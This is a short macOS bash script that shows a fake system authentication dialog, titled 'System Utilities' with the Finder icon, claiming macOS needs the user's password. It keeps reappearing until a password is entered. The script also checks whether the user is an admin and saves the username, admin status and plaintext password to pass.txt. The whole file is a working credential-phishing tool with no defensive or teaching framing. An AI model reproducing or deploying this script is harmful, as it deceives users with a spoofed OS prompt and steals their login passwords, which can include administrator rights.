#!/bin/bash

username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

read -r -d '' applescriptCode <<'EOF'
set msg1 to "MacOS is trying to authenticate user.\n\nEnter the password for the user "
set username to long user name of (system info)
set msg2 to " to allow this."
try
    set dialogText to text returned of (display dialog "" & msg1 & username & msg2 with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
    return dialogText
on error
    return "CANCEL"
end try
EOF

if dscl . -read /Groups/admin GroupMembership | awk '{print $2, $3, $4, $5, $6, $7, $8, $9}' | grep -q "$username"; then
    isadmin="(user is admin)"
else
    isadmin="(user is not admin)"
fi

capture=$(echo -e username="$username" + "$isadmin" \\n\\r_________________________________________________________________________________________\\n\\r\\n\\r)

while true; do
    dialogText=$(osascript -e "$applescriptCode")
    if [[ "$dialogText" != "CANCEL" ]]; then
        capture="$capture$(echo -e password = "$dialogText" \\n\\r)"
        break
    fi
done

echo "$capture" >> pass.txt
